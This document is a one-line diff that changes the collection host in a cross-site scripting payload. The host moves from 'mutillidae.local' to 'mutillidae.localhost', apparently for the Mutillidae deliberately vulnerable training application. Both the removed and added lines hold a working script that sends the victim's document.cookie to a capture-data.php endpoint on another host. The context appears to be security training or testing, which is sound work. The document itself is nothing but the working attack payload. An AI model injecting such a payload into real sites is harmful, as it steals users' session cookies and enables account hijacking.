@@ -1,1 +1,1 @@
-<script>new Image().src="http://mutillidae.local/capture-data.php?cookie="+encodeURI(document.cookie);</script>
+<script>new Image().src="http://mutillidae.localhost/capture-data.php?cookie="+encodeURI(document.cookie);</script>
